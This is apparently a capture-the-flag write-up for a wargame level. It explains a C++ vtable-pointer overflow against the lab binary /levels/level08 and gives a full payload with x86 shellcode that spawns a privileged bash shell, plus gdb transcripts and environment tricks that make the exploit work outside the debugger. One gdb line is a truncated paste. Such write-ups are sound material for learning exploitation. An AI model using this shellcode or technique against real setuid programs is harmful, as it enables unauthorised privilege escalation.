# level8 yo


## Writeup

#### Memory layout
```
x											   y
[VPTR][ANNOTATION                ...][NUMBER] [VPTR][ANNOTATION                ...][NUMBER] 
   \______[fun1, fun2... ]
   			 VTABLE
```
We neec to overflow anotation so VPTR points to a VTABLE we constructed.
This vtable should contain the address of our shellcode instead of the operator+ overloaded function.
So when return six + five; get executed, our fake vtable will execute the shellcode.

1. We overflow annotation 'till we get a segfault
2. We put some `\xef\be\xad\xde` at the beginning of our buffer
3. We make our 4 bytes pointer point to the beginning of buffer after finding the address in the stack
4. We get an error telling us code at `0xdeadbeef` can't be executed. We replace `0xdeadbeef` with the address of our nop sled just after `0xdeadbeef`

Voilà!


```
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level08 $(python -c 'print "\x5c\xff\x48\xff" + "\xff\xbf\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * 57 + "BBBB" + "CCC" + "\x44\xff\xff\xbf"')

Breakpoint 1, 0x08048720 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x2f000000 in ?? ()
<f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * 57 + "BBBB" + "CCC" + "\x58\xff\xff\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level08 $(python -c 'print "\x5c\x5c\xff\xff" + "\xbf\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * 57 + "BBBB" + "CCC" + "\x58\xff\xff\xbf"')

Breakpoint 1, 0x08048720 in main ()
(gdb) c
Continuing.
process 21316 is executing new program: /bin/bash
```


## Resources

[Smashing C++ VPTRs](http://phrack.org/issues/56/8.html)
[How to print Vtables](https://stackoverflow.com/questions/6191678/print-c-vtables-using-gdb)

The shellcode would work in gdb but not on the real program. The solution is to disable env variables LINES and COLUMNS added by gdb and use env -i to have the same memory context :

```
$ env -i PWD="/levels" SHELL="/bin/bash" SHLVL=0 gdb /levels/level08
...
(gdb) unset env LINES
(gdb) unset env COLUMNS
...
(gdb) quit 
...
$ env -i PWD="/levels" SHELL="/bin/bash" SHLVL=0 /levels/level08 $(python -c 'print "\x5c\x5c\xff\xff" + "\xbf\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * 57 + "BBBB" + "CCC" + "\x58\xff\xff\xbf"')
```